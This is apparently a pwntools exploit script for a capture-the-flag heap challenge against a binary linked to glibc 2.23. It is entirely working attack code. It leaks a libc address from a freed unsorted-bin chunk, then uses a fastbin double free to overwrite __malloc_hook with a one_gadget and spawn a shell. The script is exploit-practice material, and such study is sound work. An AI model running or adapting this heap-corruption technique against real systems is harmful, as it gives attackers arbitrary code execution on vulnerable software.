#!/usr/bin/env python3

from pwn import *

exe = ELF("./fastbin_attack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
context.binary = exe
context.terminal = ["tmux", "neww", "-n", "shell"]

host, port = "locahost", 1337
user = "hacker"

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    elif args.SSH:
        return ssh(user, host)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def alloc(sz, pwn=True):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size: ", str(sz).encode())
    if(pwn):
        io.recvuntil(b"index ")
        return int(io.recvuntil(b"!", drop=True))

def write(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Content: ", data)

def read(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvline(keepends=False)

def free(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())


# -- Exploit goes here --

io = start()

alloc(0x100)
alloc(0x20)

free(0)
leak = int.from_bytes(read(0), "little") -libc.sym["main_arena"]-88
print(hex(leak))
libc.address = leak
alloc(0x100)

a = alloc(0x60)
b = alloc(0x60)
c = alloc(0x60)

free(a)
free(b)
free(a)

d = alloc(0x60)
e = alloc(0x60)

one_gadget = libc.address + 0xf1247
write(d, p64(libc.sym["__malloc_hook"]-0x23))

f = alloc(0x60)
g = alloc(0x60)

write(g, b"\x00"*0x13+p64(one_gadget))

alloc(0x50, False)
io.interactive()
